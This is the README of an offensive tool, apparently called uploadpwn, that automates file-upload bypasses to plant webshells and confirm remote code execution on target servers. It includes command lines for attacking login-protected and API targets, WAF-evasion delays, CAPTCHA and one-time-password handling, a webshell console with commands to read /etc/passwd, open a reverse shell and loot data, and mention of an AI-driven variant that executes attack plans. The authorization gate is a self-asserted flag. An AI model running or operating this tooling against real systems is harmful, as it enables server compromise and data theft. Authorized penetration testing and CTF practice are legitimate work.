# uploadpwn

> Universal file-upload attack tool for authorized penetration tests, HTB/OSCP labs, and CTFs.

[![Tests](https://img.shields.io/badge/tests-82%2F82%20passing-brightgreen)]()
[![Python](https://img.shields.io/badge/python-3.8%2B-blue)]()
[![License](https://img.shields.io/badge/license-MIT-lightgrey)]()

`uploadpwn` is a single-file Python tool that takes a target URL and tries to land
a webshell through every known file-upload bypass — `.htaccess` tricks, real image
polyglots, parser confusion, `web.config` handler hijacks, nginx / PHP-FPM /
Tomcat path-info quirks, SVG XXE, race conditions, and zip-slip. It auto-discovers
the upload endpoint, harvests required form fields, learns the storage path from
the upload response, and verifies RCE with a nonce-wrapped command — **no false
positives**.

> ⚠️ **Authorized use only.** This tool is for HTB/CTF/lab targets, owned
> infrastructure, or systems within a written pentest scope. See
> [`AI_CHECKLIST.md`](./AI_CHECKLIST.md) §0.

---

## Highlights

- **Auto endpoint discovery** — form scrape, JS bundle scrape, robots/sitemap,
  OpenAPI, OPTIONS/WebDAV, GraphQL, crawl with configurable depth.
- **Auto form-field harvesting** — hidden inputs, CSRF tokens, named submit
  buttons (the canonical `isset($_POST['submit'])` trap), `<select>` defaults.
- **Real polyglots** — 14 builders (PNG/JPEG-COM/EXIF/ICC, GIF, PDF, ZIP, SVG,
  DOCX, MP4, MP3, Phar-JPEG, WebP, AVIF) that survive `PIL.verify()`.
- **32 `.htaccess` / `.user.ini` / `php.ini` tricks** + **8 `web.config`
  variants** + **12 nginx / FPM / Tomcat tricks** + **19 parser-confusion
  filename smuggles**.
- **Zero false-positive RCE verifier** — every shell is confirmed by a fresh
  nonce echoed twice with content between.
- **Full auth catalogue** — Basic, Digest, NTLM, Bearer/JWT, API-key, mTLS,
  multi-step form login, JSON SPA login with rotating CSRF, OTP (`--otp-value`
  / `--otp-totp-secret` / `--otp-prompt`), CAPTCHA detection.
- **Burp-style `-r REQUEST_FILE`** to derive method/URL/headers/cookies from
  a raw HTTP dump.
- **4-state report** — `RCE_CONFIRMED` / `UPLOAD_ACCEPTED` / `FILTER_BYPASSED` /
  `FAILED` per audit step, plus per-state counters and SHA-256 of every payload.
- **Smart `--endpoint` resolver** — accepts any of `/path`, `path`, `host/path`,
  `host:port/path`, `http(s)://...`, or `//host/path`.

---

## Quick start

### Install

```bash
git clone https://github.com/<you>/uploadpwn.git
cd uploadpwn
pip install -r requirements.txt        # requests, beautifulsoup4, pyotp, Pillow
                                        # (selenium and requests-ntlm are optional)
```

Or minimal install — `uploadpwn.py` is a single file and only hard-needs
`requests`. Everything else degrades gracefully if missing.

### 60-second demo

```bash
python uploadpwn.py -t http://10.10.11.42 --i-am-authorized
```

That's it. The tool will:

1. Probe `/`, fingerprint the stack (server / language / OS).
2. Discover upload endpoints from the page's forms, JS bundles, robots, sitemap,
   OpenAPI, OPTIONS, and a small brute-force list.
3. Auto-harvest hidden form fields (`csrf_token`, `__VIEWSTATE`,
   `submit=Purchase`, etc.).
4. Run the bypass matrix cheapest-first: `.htaccess` → polyglots →
   parser-confusion → nginx tricks → `web.config` → full
   filename×content-type×shell matrix.
5. On a successful upload, verify RCE with a nonce-wrapped probe.
6. Print a structured report and write `uploadpwn_report.json`.

Sample output:

```
[*] PROBE: Fingerprinting active filters...
  [BYPASSED] filter: 'Content-Type Filter' bypassed via: spoof to image/jpeg
  [BYPASSED] filter: 'Extension Filter' bypassed via: null byte: shell.php%00.jpg
[*] MODULE 2: .htaccess / .user.ini / php.ini  (32 tricks)
[✓] trick 1/32: addtype_jpg (.htaccess) accepted
  [BYPASSED] filter: '.htaccess' bypassed via: addtype_jpg
[!!!] RCE CONFIRMED!

╔═══════════════════════════════════════════════╗
║  ✓  SHELL IS LIVE                             ║
╠═══════════════════════════════════════════════╣
║  URL    : http://10.10.11.42/uploads/shell.jpg║
║  Param  : cmd                                 ║
╚═══════════════════════════════════════════════╝
```

---

## Common scenarios

### HTB-style box with a public upload form

```bash
python uploadpwn.py -t http://10.10.11.42 --i-am-authorized --interactive
```

Drops you into an interactive webshell on RCE. The REPL supports
`!read /etc/passwd`, `!find /var/www -name '*.php'`, `!revshell IP PORT`,
`!loot`.

### Authenticated upload behind a login

```bash
python uploadpwn.py \
  -t http://target.com \
  --login /login.php --user admin --pass hunter2 \
  --upload-page /dashboard \
  --i-am-authorized
```

Handles CSRF tokens, multi-step wizards (login → 2FA → dashboard), and
session-expiry mid-scan (`--relogin-on-expiry`).

### SPA with JSON login and rotating CSRF

```bash
python uploadpwn.py \
  -t https://api.target.com \
  --json-login /api/v1/auth/login --user admin --pass hunter2 \
  --token-path access_token --csrf-path next_csrf \
  --csrf-header X-CSRF-Token \
  --i-am-authorized
```

### Re-using a Burp request

```bash
python uploadpwn.py -r burp_request.txt --i-am-authorized
```

`uploadpwn` parses Burp's raw-request export (`POST /upload HTTP/1.1\nHost:
…\n\n…`), extracts the URL, headers, cookies, file field name, and body.

### Driving every discovered endpoint

```bash
python uploadpwn.py -t http://target.com --attack-all --i-am-authorized
# or, to NOT stop on first RCE (full coverage map):
python uploadpwn.py -t http://target.com --attack-all --exhaust --i-am-authorized
```

### Targeted module + safety knobs

```bash
python uploadpwn.py -t http://target.com \
  --htaccess \
  --delay 0.5 --jitter 0.2 --rate-limit 5 \
  --request-budget 1000 \
  --waf-pause 5 \
  --i-am-authorized
```

### Clean up after yourself

```bash
python uploadpwn.py -t http://target.com --all --cleanup --i-am-authorized
```

On exit, every uploaded `.htaccess` / `.user.ini` / `web.config` / shell
artifact is deleted — via HTTP `DELETE` first, then `rm`/`del` through the
confirmed webshell if the server rejects `DELETE` (most do).

---

## The `--endpoint` flag — smart resolver

You can pass `--endpoint` in any shape the operator might type:

| `-t` (target)            | `-e` (endpoint)                       | Resolved upload URL                          |
|--------------------------|---------------------------------------|----------------------------------------------|
| `http://10.0.0.1`        | `/upload.php`                         | `http://10.0.0.1/upload.php`                 |
| `http://10.0.0.1`        | `upload.php`                          | `http://10.0.0.1/upload.php`                 |
| `http://10.0.0.1`        | `http://other.tld/u.php`              | `http://other.tld/u.php` (target swaps)      |
| `http://10.0.0.1`        | `other.tld/u.php`                     | `http://other.tld/u.php` (inherits scheme)   |
| `https://10.0.0.1`       | `other.tld:9000/u.php`                | `https://other.tld:9000/u.php`               |
| `https://10.0.0.1`       | `//other.tld/u.php`                   | `https://other.tld/u.php`                    |

When the endpoint points to a different host than `-t`, the **effective target**
swaps automatically (banner shows the change) — so storage-path discovery and
brute-force fallbacks aim at the right host.

---

## Full flag reference

### Target & endpoint

| Flag                          | What it does                                                              |
|-------------------------------|---------------------------------------------------------------------------|
| `-t, --target URL`            | Target base URL. Required unless `-r` supplies it.                        |
| `-r, --request FILE`          | Burp / raw HTTP request file (sqlmap-style).                              |
| `--https`                     | Force HTTPS when `-r` is used.                                            |
| `-e, --endpoint EP`           | Upload endpoint (any of the 6 shapes above; auto-detected if omitted).    |
| `--field NAME`                | File-upload field name (auto-detected if omitted).                        |
| `--extra-field NAME=VALUE`    | Add a multipart field to every upload. Repeatable.                        |
| `--shell-dirs DIR [...]`      | Override the 17-dir storage brute list.                                   |
| `--cmd-param NAME`            | Webshell command parameter name (default `cmd`).                          |
| `--flag PATH`                 | File to read after RCE (default `/flag.txt`).                             |

### Authorization gate (HARD)

| Flag                  | What it does                                                                  |
|-----------------------|-------------------------------------------------------------------------------|
| `--i-am-authorized`   | Operator asserts authorization. Stamps the audit log. **Required** for clean runs. |
| `--captcha-prompt`    | Surface a CAPTCHA gate to the operator; pauses for cookie replay.            |

### Authentication

| Flag                                              | Use case                                  |
|---------------------------------------------------|-------------------------------------------|
| `--login PATH --user U --pass P`                  | HTML form login                           |
| `--login-method auto\|requests\|selenium`         | Force a login backend                     |
| `--nav PATH`                                      | Page to navigate to **after** login       |
| `--upload-page PATH`                              | Page where the upload form lives          |
| `--cookie NAME=VALUE`                             | Inject a cookie. Repeatable.              |
| `--header "Name: Value"`                          | Inject a header. Repeatable.              |
| `--basic-auth USER:PASS`                          | HTTP Basic                                |
| `--digest-auth USER:PASS`                         | HTTP Digest                               |
| `--ntlm-auth USER:PASS`                           | NTLM (needs `requests-ntlm`)              |
| `--bearer TOKEN`                                  | Static Bearer / JWT                       |
| `--api-key HEADER:VALUE`                          | Static API-key header                     |
| `--cert PATH[,KEYPATH]`                           | Client cert (mTLS)                        |
| `--json-login URL --token-path KEY`               | SPA-style JSON login + token extraction   |
| `--csrf-path KEY --csrf-header NAME`              | Rotating CSRF in the JSON body            |
| `--otp-value CODE`                                | One-shot OTP                              |
| `--otp-totp-secret B32`                           | TOTP secret — auto-generates code         |
| `--otp-prompt`                                    | Prompt operator at runtime                |
| `--otp-field NAME`                                | Form field for the OTP code               |
| `--otp-url PATH`                                  | Explicit `/verify-otp` page               |
| `--relogin-on-expiry`                             | Re-run login if session dies mid-scan     |

### Transport

| Flag                          | What it does                                                            |
|-------------------------------|-------------------------------------------------------------------------|
| `--proxy URL`                 | Proxy (e.g. Burp at `http://127.0.0.1:8080`).                           |
| `-k, --insecure`              | Disable TLS verification.                                               |
| `--ca-bundle PATH`            | Custom CA bundle.                                                       |
| `--timeout SEC`               | Per-request timeout (default 15).                                       |
| `--delay SEC`                 | Sleep between requests (WAF evasion).                                   |
| `--jitter SEC`                | Random ± jitter on top of `--delay`.                                    |
| `--rate-limit RPS`            | Hard cap on requests per second.                                        |
| `--request-budget N`          | Total request cap per run (default 5000). Exit code **4** if exhausted. |
| `--waf-pause SEC`             | Sleep N seconds when a WAF fingerprint is seen (default 3, 0 disables). |
| `--retry N`                   | Per-request retries on 429/5xx with exponential backoff.                |
| `--backoff F`                 | Backoff factor for retries.                                             |
| `--threads N`                 | Concurrent workers for the matrix.                                      |
| `--user-agent STR`            | Override the User-Agent.                                                |

### Modules

| Flag                          | Module                                                                  |
|-------------------------------|-------------------------------------------------------------------------|
| `--all`                       | Run every module.                                                       |
| `--matrix`                    | Full filename × shell × content-type matrix (default if nothing else).  |
| `--htaccess`                  | 32 `.htaccess` / `.user.ini` / `php.ini` tricks.                        |
| `--polyglots`                 | 14 real polyglot images.                                                |
| `--parser-confusion`          | 19 filename + Content-Disposition smuggles.                             |
| `--nginx-tricks`              | 12 nginx / FPM / Tomcat / Jetty path-info tricks.                       |
| `--webconfig`                 | 8 IIS `web.config` handler-hijack variants.                             |
| `--svg-read PATH`             | SVG XXE file read.                                                      |
| `--svg-src FILE`              | SVG XXE PHP source read.                                                |
| `--svg-xss`                   | SVG XSS payload.                                                        |
| `--svg-ssrf URL`              | SVG SSRF probe.                                                         |
| `--race`                      | Upload-then-delete race condition.                                      |
| `--zip`                       | Zip-slip.                                                               |
| `--dos`                       | DoS payload — needs explicit per-run consent.                           |
| `--discover`                  | Run upload-form-field discovery and exit.                               |
| `--discover-only`             | Run **endpoint** discovery and exit (no attacks).                       |
| `--attack-all`                | Drive every discovered endpoint, not just the top one.                  |
| `--exhaust`                   | Don't stop on first RCE under `--attack-all`.                           |
| `--cleanup`                   | DELETE every uploaded artifact at end of run.                           |
| `--crawl-depth N`             | Discovery crawl depth (default 2).                                      |
| `--max-pages N`               | Discovery crawl page cap (default 20).                                  |
| `--no-probe`                  | Skip filter fingerprinting.                                             |

### Output

| Flag                        | What it does                                                              |
|-----------------------------|---------------------------------------------------------------------------|
| `--interactive`             | Drop into the webshell REPL on RCE.                                       |
| `-v, --verbose`             | Verbose per-attempt logging.                                              |
| `-o, --output FILE`         | JSON report path (default `uploadpwn_report.json`).                       |

---

## Report schema

`uploadpwn_report.json` is the source of truth. Every action goes here:

```json
{
  "tool": "uploadpwn",
  "version": "5.0.0",
  "target": "http://10.10.11.42",
  "start": "2026-05-12T14:37:22",
  "end":   "2026-05-12T14:38:11",
  "filters": {"Content-Type Filter": "bypassed", ".htaccess": "bypassed", ...},
  "rce": [
    {"file": "shell.jpg", "url": "http://10.10.11.42/uploads/shell.jpg",
     "output": "uid=33(www-data) gid=33(www-data) ...",
     "shell": "standard", "ct": "image/jpeg"}
  ],
  "outcomes": {
    "RCE_CONFIRMED": 1,
    "UPLOAD_ACCEPTED": 1,
    "FILTER_BYPASSED": 4,
    "FAILED": 0
  },
  "artifacts": [],          // emptied by --cleanup
  "steps": [
    {"ts": "...", "category": "RCE", "status": "found",
     "detail": "RCE via 'shell.jpg' shell=standard",
     "extra": {"url": "..."}, "state": "RCE_CONFIRMED",
     "target": "http://10.10.11.42/uploads/shell.jpg",
     "payload_sha256": "..."}
  ],
  "suggestions": ["Use .phtml, .pht, .php5 to bypass blacklist", ...]
}
```

---

## Exit codes

| Code | Meaning                                                              |
|------|----------------------------------------------------------------------|
| `0`  | RCE confirmed, or `--discover-only` completed.                       |
| `1`  | Run finished without RCE. Some uploads may have been accepted.       |
| `2`  | Authentication failed, CAPTCHA without `--captcha-prompt`, etc.      |
| `3`  | Network unreachable / connection error.                              |
| `4`  | `--request-budget` exhausted.                                        |
| `130`| Interrupted by operator (Ctrl-C).                                    |

---

## How verification works (no false positives)

Every RCE claim is nonce-wrapped:

```
echo <16-hex-nonce>; id; echo <same-nonce>
```

The verifier accepts the response **only if** the nonce appears twice with
content between the two occurrences. Substring matches on `uid=`, `root`,
`/bin`, or `GIF89a` alone never count. See [`AI_CHECKLIST.md`](./AI_CHECKLIST.md)
§7 for the full honesty bar.

---

## Tests

```bash
pytest -q
# 82 passed in ~7s
```

The suite covers:

- 60 original tests (auth flows, transport quirks, multi-endpoint behavior,
  discovery sources, payload catalogues).
- 13 checklist-v2 tests (request budget, rate-limit spacing, payload hashing,
  outcome state counters, artifact tracking, cleanup deletion, CAPTCHA regex,
  17-dir shell list).
- 9 endpoint-shape tests (`smart_endpoint` parametrized).

---

## Files

| File                  | Purpose                                                              |
|-----------------------|----------------------------------------------------------------------|
| `uploadpwn.py`        | Main tool — single file, runs on Python 3.8+.                        |
| `uploadpwnAI.py`      | AI-driven variant (operator-prompt → automated plan execution).      |
| `polyglots.py`        | 14 real polyglot file builders.                                      |
| `AI_CHECKLIST.md`     | The operating spec — every assertion the tool must satisfy.          |
| `IMPROVEMENTS.md`     | Field-trial findings & prioritized backlog.                          |
| `tests/`              | Pytest suite (mock targets + assertions).                            |

---

## Contributing

New bypass = new entry in the catalogue **plus** a new pytest case. Both, same PR.
The catalogue counts are pinned by tests (≥30 htaccess, ≥8 webconfig, ≥12 nginx,
≥18 parser-confusion, ≥14 polyglots) — a refactor that shrinks any of them
fails CI.

---

## License

MIT. See [LICENSE](./LICENSE).

---

## Acknowledgments

Built for HTB / OSCP-style boxes and authorized engagements. Standing on the
shoulders of:

- [BlackFan/sec-research](https://github.com/BlackFan/) — `.htaccess` magic
- [orangetsai](https://blog.orange.tw/) — nginx/IIS parser confusion
- [Synacktiv](https://www.synacktiv.com/) — Phar / polyglot exploitation
- The HackTricks crew — comprehensive bypass catalogue
- Every CTF organizer who put an upload form on the box
